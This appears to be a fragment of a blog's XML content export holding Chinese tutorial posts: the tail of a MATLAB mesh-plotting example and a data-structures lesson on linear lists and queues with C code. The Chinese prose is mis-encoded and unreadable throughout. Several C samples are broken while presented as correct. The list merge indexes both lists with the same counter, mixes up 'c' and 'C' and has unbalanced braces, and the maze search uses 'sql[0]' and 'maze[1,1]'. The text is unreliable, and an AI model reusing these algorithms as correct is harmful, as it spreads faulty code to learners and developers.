class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X,Y,Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>æˆå“å›¾å¦‚ä¸‹</code>ï¼š</p><div align="center"><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/08/5bbafba7df128.png" class="lazyload"></div>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ¨¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°æ®ç»“æ„å’Œç®—æ³•-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°æ®ç»“æ„å’Œç®—æ³•-ï¼ˆAlgorithmï¼‰-çº¿æ€§ç»“æ„"><a href="#æ•°æ®ç»“æ„å’Œç®—æ³•-ï¼ˆAlgorithmï¼‰-çº¿æ€§ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„å’Œç®—æ³• ï¼ˆAlgorithmï¼‰- çº¿æ€§ç»“æ„"></a>æ•°æ®ç»“æ„å’Œç®—æ³• ï¼ˆAlgorithmï¼‰- çº¿æ€§ç»“æ„</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; çº¿æ€§ç»“æ„çš„åŸºæœ¬ç‰¹å¾æ˜¯ï¼šåœ¨æ•°æ®å…ƒç´ çš„éç©ºæœ‰é™é›†ä¸­ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå…ƒç´ æ²¡æœ‰å‰é©±ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ•°æ®å…ƒç´ æ²¡æœ‰åç»§ï¼›å…¶ä½™æ•°æ®å…ƒç´ æœ‰ä¸”ä»…æœ‰åªæœ‰ä¸€ä¸ªç›´æ¥çš„å‰é©±å’Œåç»§ã€‚</p><pre class=" language-c"><code class="language-c">ä¾‹å¦‚<span class="token punctuation">:</span>   <span class="token operator">*</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">*</span></code></pre><h2 id="çº¿æ€§è¡¨"><a href="#çº¿æ€§è¡¨" class="headerlink" title="çº¿æ€§è¡¨"></a>çº¿æ€§è¡¨</h2><p> &nbsp; &nbsp; &nbsp; çº¿æ€§è¡¨æ˜¯ç”±åŒä¸€ç±»å‹çš„æ•°æ®å…ƒç´ æ„æˆçš„çº¿æ€§ç»“æ„ï¼Œç‰¹ç‚¹æ˜¯ï¼šæ•°æ®å…ƒç´ é—´å‘ˆä¸€ç§çº¿æ€§å…³ç³»ã€‚çº¿æ€§è¡¨æ˜¯å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„nä¸ªæ•°æ®å…ƒç´ çš„æœ‰é™åºåˆ—ï¼Œé€šå¸¸è®°ä¸ºï¼š</p><p>ï¼ˆa1ï¼Œa2ï¼Œa3ï¼ŒÂ·Â·Â·Â·Â·Â·ï¼Œa(i-1)ï¼Œaiï¼Œa(i+1)ï¼ŒÂ·Â·Â·Â·Â·Â·ï¼Œanï¼‰</p><p><code>çº¿æ€§è¡¨æŠ½è±¡æ•°æ®ç±»å‹</code>ï¼š</p><pre class=" language-c"><code class="language-c">ADT List<span class="token punctuation">{</span>æ•°æ®å¯¹è±¡<span class="token punctuation">:</span> D<span class="token operator">=</span><span class="token punctuation">{</span>ai<span class="token operator">|</span> <span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span>ElemSet<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">}</span>æ•°æ®å…³ç³»<span class="token punctuation">:</span> R1<span class="token operator">=</span><span class="token punctuation">{</span>i<span class="token number">-1</span><span class="token punctuation">,</span>ai<span class="token operator">></span><span class="token operator">|</span> ai<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span> D<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">}</span>åŸºæœ¬æ“ä½œï¼š<span class="token function">InitList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">//åˆå§‹åŒ–</span><span class="token function">DestroyList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//åˆ é™¤</span><span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//æ’å…¥</span><span class="token function">ListDelete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//åˆ é™¤æŒ‡å®šå…ƒç´ </span><span class="token punctuation">}</span>ADT List</code></pre><p>çº¿æ€§è¡¨æœ‰ä¸¤ç§å­˜å‚¨ç»“æ„ï¼š</p><p> &nbsp; &nbsp; &nbsp; â‘ å®šé•¿çš„é¡ºåºå­˜å‚¨ç»“æ„â€”â€”å‘é‡å‹çš„ä¸€ç»´æ•°ç»„ç»“æ„</p><p> &nbsp; &nbsp; &nbsp; â‘¡å˜é•¿çš„çº¿æ€§è¡¨å­˜å‚¨ç»“æ„â€”â€”é“¾æ¥å¼å­˜å‚¨ç»“æ„ï¼ŒåŠ¨æ€æ•°ç»„ï¼Œé¡ºåºæ–‡ä»¶</p><h3 id="çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ä»¥åŠè¿ç®—å®ç°"><a href="#çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ä»¥åŠè¿ç®—å®ç°" class="headerlink" title="çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ä»¥åŠè¿ç®—å®ç°"></a>çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ä»¥åŠè¿ç®—å®ç°</h3><p> &nbsp; &nbsp; &nbsp; ä¼—äººçš†çŸ¥çš„æ•°ç»„ï¼Œå…¶å®å°±æ˜¯ä»¥é¡ºåºç»“æ„å­˜å‚¨æ•°æ®çš„çº¿æ€§è¡¨ã€‚</p><blockquote><p> é¡ºåºè¡¨ç¤ºä¾‹å›¾ï¼š</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/09/5bbbfe6d21e6a.png" alt=""><br></div><blockquote><p>é¡ºåºè¡¨ç»“æ„ç®—æ³•ï¼š</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 20           </span><span class="token comment" spellcheck="true">// é¡ºåºè¡¨çš„æœ€å¤§å­˜å‚¨å®¹é‡</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// é¡ºåºè¡¨å­˜å‚¨çš„æ•°æ®ç±»å‹</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    datatype data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//çº¿æ€§è¡¨å­˜å‚¨æ•°æ®</span>    <span class="token keyword">int</span> Last<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//çº¿æ€§è¡¨çš„é•¿åº¦</span><span class="token punctuation">}</span>SeqList<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®šä¹‰ä¸€ä¸ªé¡ºåºè¡¨ SeqList L;</span><span class="token comment" spellcheck="true">//å®šä¹‰ä¸€ä¸ªSeqListç±»å‹çš„æŒ‡é’ˆ SeqList *L;</span>SeqList <span class="token operator">*</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//åˆå§‹åŒ–çº¿æ€§è¡¨</span>    SeqList <span class="token operator">*</span>L<span class="token punctuation">;</span>    L <span class="token operator">=</span> <span class="token punctuation">(</span>SeqList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SeqList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token operator">-></span>Last<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> L<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    SeqList <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        L<span class="token operator">-></span>Last <span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"å½“å‰é¡ºåºè¡¨çš„é•¿åº¦ä¸º %dï¼Œé¡ºåºè¡¨çš„å¤§å°ä¸º %d"</span><span class="token punctuation">,</span>L<span class="token operator">-></span>Last<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p> &nbsp; &nbsp; &nbsp; é¡ºåºè¡¨åº”ç”¨ä¸¾ä¾‹ï¼šæœ‰é¡ºåºè¡¨Aï¼ŒBï¼Œå…¶å…ƒç´ å‡æŒ‰ä»å°åˆ°å¤§çš„å‡åºæ’åˆ—ï¼Œç¼–å†™ä¸€ä¸ªç®—æ³•å°†ä»–ä»¬åˆå¹¶æˆä¸€ä¸ªé¡ºåºè¡¨Cï¼Œè¦æ±‚Cçš„å…ƒç´ ä¹Ÿæ˜¯ä»å°åˆ°å¤§çš„å‡åºæ’åˆ—ã€‚</p><p> &nbsp; &nbsp; &nbsp; ç®—æ³•æ€è·¯ï¼šä¾æ¬¡æ‰«æAå’ŒBä¸­çš„å…ƒç´ ï¼Œæ¯”è¾ƒå½“å‰å…ƒç´ çš„å€¼ï¼Œå°†è¾ƒå°å€¼çš„å…ƒç´ èµ‹ç»™Cï¼Œç›´åˆ°ä¸€ä¸ªçº¿æ€§è¡¨æ‰«æå®Œæ¯•ä¹‹åå°†æœªå®Œçš„é‚£ä¸ªé¡ºåºè¡¨ä¸­ä½™ä¸‹çš„é‚£éƒ¨åˆ†èµ‹ç»™Cï¼Œä¸”Cçš„å®¹é‡éœ€è¦èƒ½å¤Ÿå®¹çº³A,Bä¸¤ä¸ªçº¿æ€§è¡¨ç›¸åŠ çš„é•¿åº¦ï¼Œ<strong>ç®—æ³•å¦‚ä¸‹</strong>ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>SeqList A<span class="token punctuation">,</span>SeqList B<span class="token punctuation">,</span>SeqList <span class="token operator">*</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    C<span class="token operator">-></span>last<span class="token operator">=</span>k<span class="token number">-1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>é¡ºåºè¡¨çš„ä¼˜ç¼ºç‚¹ï¼š</p><p>çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„ï¼Œåœ¨å­˜ã€è¯»å–æ•°æ®æ—¶ï¼Œä¸ç®¡æ˜¯åœ¨å“ªä¸ªä½ç½®ï¼Œæ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(1)ã€‚è€Œåœ¨æ’å…¥æˆ–è€…åˆ é™¤æ—¶ï¼Œæ—¶é—´å¤æ‚åº¦éƒ½æ˜¯O(n)ã€‚</p><p>è¿™ä¹Ÿå°±æ˜¯çº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„æ¯”è¾ƒé€‚åˆå­˜å–æ•°æ®ï¼Œä¸é€‚åˆç»å¸¸æ’å…¥å’Œåˆ é™¤æ•°æ®çš„åº”ç”¨ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><p>1.æ— éœ€ä¸ºäº†è¡¨ç¤ºè¡¨ä¸­å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»è€Œå¢åŠ é¢å¤–çš„å­˜å‚¨ç©ºé—´ï¼ˆç›¸å¯¹äºé“¾å¼å­˜å‚¨è€Œè¨€ï¼‰ã€‚</p><p>2.å¯ä»¥å¿«é€Ÿçš„å­˜å–è¡¨ä¸­ä»»æ„ä½ç½®çš„å…ƒç´ ã€‚</p><p>ç¼ºç‚¹ï¼š</p><p>1.æ’å…¥å’Œåˆ é™¤æ“ä½œéœ€è¦ç§»åŠ¨å¤§é‡çš„å…ƒç´ ã€‚</p><p>2.å½“çº¿æ€§è¡¨é•¿åº¦å˜åŒ–è¾ƒå¤§æ—¶ï¼Œéš¾ä»¥ç¡®å®šå­˜å‚¨ç©ºé—´çš„å®¹é‡ã€‚</p><p>3.å®¹æ˜“é€ æˆå­˜å‚¨ç©ºé—´çš„â€œç¢ç‰‡â€(å› ä¸ºçº¿æ€§è¡¨çš„é¡ºåºå­˜å‚¨ç»“æ„ç”³è¯·çš„å†…å­˜ç©ºé—´éƒ½ä»¥è¿ç»­çš„ï¼Œå¦‚æœå› ä¸ºæŸäº›æ“ä½œï¼ˆæ¯”å¦‚åˆ é™¤æ“ä½œï¼‰å¯¼è‡´æŸä¸ªéƒ¨åˆ†å‡ºç°äº†ä¸€å°å—çš„ä¸è¿ç»­å†…å­˜ç©ºé—´ï¼Œå› ä¸ºè¿™ä¸€å°å—å†…å­˜ç©ºé—´å¤ªå°ä¸èƒ½å¤Ÿå†æ¬¡è¢«åˆ©ç”¨/åˆ†é…ï¼Œé‚£ä¹ˆå°±é€ æˆäº†å†…å­˜æµªè´¹ï¼Œä¹Ÿå°±æ˜¯â€œç¢ç‰‡â€)</p><p>å‚è€ƒ <a href="https://www.cnblogs.com/wsnb/p/5191518.html" target="_blank" rel="noopener">https://www.cnblogs.com/wsnb/p/5191518.html</a></p></blockquote><h3 id="çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨å’Œè¿ç®—å®ç°"><a href="#çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨å’Œè¿ç®—å®ç°" class="headerlink" title="çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨å’Œè¿ç®—å®ç°"></a>çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨å’Œè¿ç®—å®ç°</h3><p> &nbsp; &nbsp; &nbsp; é¡ºåºè¡¨æœ€å¤§çš„ç¼ºç‚¹æ˜¯ç§»åŠ¨æ•°æ®å…ƒç´ éœ€è¦è€—è´¹è®¸å¤šæ—¶é—´ï¼Œå½±å“æ“ä½œæ•ˆç‡ã€‚æ­£æ˜¯å› ä¸ºé¡ºåºè¡¨çš„ç‰¹æ€§ï¼Œç›¸é‚»ä¸¤å…ƒç´ ä¹‹é—´çš„æ•°æ®å­˜åœ¨ç›¸é‚»çš„å…³ç³»ï¼Œä½¿å¾—æ’å…¥åˆ é™¤çš„æ“ä½œéº»çƒ¦äº†è®¸å¤šã€‚</p><p> &nbsp; &nbsp; &nbsp; è€Œé“¾å¼å­˜å‚¨æ–¹æ³•ä¸éœ€è¦ç”¨åœ°å€è¿ç»­çš„å­˜å‚¨å•å…ƒæ¥å®ç°ï¼Œä»è€Œå¯ä»¥ä½¿å¾—é€»è¾‘ç›¸é‚»çš„ä¸¤æ•°æ®å…ƒç´ åœ¨ç‰©ç†ä¸Šä¸ç›¸é‚»ï¼Œä½†æœ‰ä¼˜ç‚¹å°±æœ‰ç¼ºç‚¹ï¼Œé“¾å¼å­˜å‚¨æ–¹æ³•ä¸èƒ½è¿›è¡Œéšæœºå­˜å–ã€‚</p><p> &nbsp; &nbsp; &nbsp; è€Œé“¾è¡¨åˆæœ‰å•é“¾è¡¨ï¼Œå¾ªç¯é“¾è¡¨ï¼ŒåŒå‘é“¾è¡¨ï¼Œé™æ€é“¾è¡¨çš„åŒºåˆ«ã€‚</p><h2 id="é˜Ÿåˆ—"><a href="#é˜Ÿåˆ—" class="headerlink" title="é˜Ÿåˆ—"></a>é˜Ÿåˆ—</h2><blockquote><p>é˜Ÿåˆ—æ˜¯ä¸€ç§æ“ä½œå—é™çš„çº¿æ€§æ•°æ®ç»“æ„ï¼Œä¸æ ˆåè¿›å…ˆå‡º(LIFO)çš„æ•°æ®ç»“æ„æˆªç„¶ä¸åŒçš„æ˜¯é˜Ÿåˆ—æ˜¯ä¸€ç§â€œå…ˆè¿›å…ˆå‡ºâ€ï¼ˆFIFOï¼‰çš„æ•°æ®ç»“æ„ã€‚å°†è¿™ç§æ’å…¥åœ¨è¡¨ä¸€ç«¯è¿›è¡Œï¼Œè€Œåˆ é™¤åœ¨è¡¨å¦ä¸€ç«¯è¿›è¡Œçš„æ•°æ®ç»“æ„ç§°ä¸ºé˜Ÿåˆ—ï¼ˆQueue)ï¼Œå¹¶å…è®¸æ’å…¥çš„ä¸€ç«¯ä¸ºé˜Ÿå°¾ï¼ˆRearï¼‰ï¼Œå…è®¸åˆ é™¤çš„ä¸€ç«¯ä¸ºé˜Ÿé¦–ï¼ˆFrontï¼‰ã€‚</p><p><img src="https://i.loli.net/2018/10/16/5bc53818b751c.png" alt=""></p><p>é˜Ÿåˆ—çš„æŠ½è±¡æ•°æ®ç±»å‹å¦‚ä¸‹ï¼š</p><pre><code>ADT Queue{æ•°æ®å¯¹è±¡ï¼šD={ai|aiâˆˆElemSet, i=1,2, â€¦,n, nâ‰¥0}æ•°æ®å…³ç³»ï¼šR1={&lt;ai-1,ai&gt;|ai-1,aiâˆˆD, i=1,2, â€¦,n }            çº¦å®ša1ä¸ºé˜Ÿåˆ—å¤´ï¼Œanä¸ºé˜Ÿåˆ—å°¾ã€‚åŸºæœ¬æ“ä½œï¼š    InitQueue( &amp;Q ):      æ“ä½œç»“æœï¼šæ„é€ ä¸€ä¸ªç©ºé˜Ÿåˆ—Qã€‚    DestroyQueue ( &amp;Q ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ã€‚      æ“ä½œç»“æœï¼šé”€æ¯é˜Ÿåˆ—Qã€‚    ClearQueue ( &amp;Q ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ã€‚      æ“ä½œç»“æœï¼šå°†Qæ¸…ä¸ºç©ºé˜Ÿåˆ—ã€‚    QueueEmpty( Q ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ã€‚      æ“ä½œç»“æœï¼šè‹¥Qä¸ºç©ºé˜Ÿåˆ—ï¼Œåˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚    QueueLength( Q ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ã€‚      æ“ä½œç»“æœï¼šè¿”å›Qçš„æ•°æ®å…ƒç´ ä¸ªæ•°ï¼Œå³é˜Ÿåˆ—çš„é•¿åº¦ã€‚    GetHead( Q, &amp;e ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ä¸”éç©ºã€‚      æ“ä½œç»“æœï¼šç”¨eè¿”å›Qçš„é˜Ÿå¤´å…ƒç´ ã€‚    EnQueue( &amp;Q, e ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ã€‚      æ“ä½œç»“æœï¼šæ’å…¥å…ƒç´ eä¸ºQçš„æ–°çš„é˜Ÿå°¾å…ƒç´ ã€‚    DeQueue( &amp;Q, &amp;e ):      åˆå§‹æ¡ä»¶ï¼šé˜Ÿåˆ—Qå·²å­˜åœ¨ä¸”éç©ºã€‚      æ“ä½œç»“æœï¼šåˆ é™¤Qçš„é˜Ÿå¤´å…ƒç´ ï¼Œå¹¶ç”¨eè¿”å›å…¶å€¼ã€‚}ADT Queue</code></pre></blockquote><h3 id="åŸºäºé˜Ÿåˆ—çš„ç®—æ³•è®¾è®¡å®ä¾‹"><a href="#åŸºäºé˜Ÿåˆ—çš„ç®—æ³•è®¾è®¡å®ä¾‹" class="headerlink" title="åŸºäºé˜Ÿåˆ—çš„ç®—æ³•è®¾è®¡å®ä¾‹"></a>åŸºäºé˜Ÿåˆ—çš„ç®—æ³•è®¾è®¡å®ä¾‹</h3><blockquote><p>â€‹    æ±‚è¿·å®«çš„æœ€çŸ­è·¯å¾„ï¼šç°è¦æ±‚è®¾è®¡ä¸€ä¸ªç®—æ³•æ‰¾ä¸€æ¡ä»è¿·å®«å…¥å£åˆ°å‡ºå£çš„æœ€çŸ­è·¯å¾„ã€‚</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//é˜Ÿçš„å®šä¹‰</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//è®°å½•åæ ‡</span>    <span class="token keyword">int</span> pre<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//preä½œä¸ºå‰é©±ç‚¹åœ¨sqä¸­çš„åæ ‡</span><span class="token punctuation">}</span>sqtype<span class="token punctuation">;</span>sqtype sq<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å®šä¹‰å¤´å°¾</span><span class="token comment" spellcheck="true">//ç®—æ³•å¦‚ä¸‹ï¼š</span><span class="token keyword">void</span> <span class="token function">path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>move<span class="token punctuation">)</span>    <span class="token keyword">int</span> maze<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//è¿·å®«æ•°ç»„</span>    item move<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//åæ ‡å¢é‡æ•°ç»„</span><span class="token punctuation">{</span>    sqtype sq<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>v<span class="token punctuation">;</span>    front <span class="token operator">=</span> rear <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>sql<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    maze<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>front<span class="token operator">&lt;=</span>rear<span class="token punctuation">)</span><span class="token punctuation">{</span>        x <span class="token operator">=</span> sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>y<span class="token operator">=</span>sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>v<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" 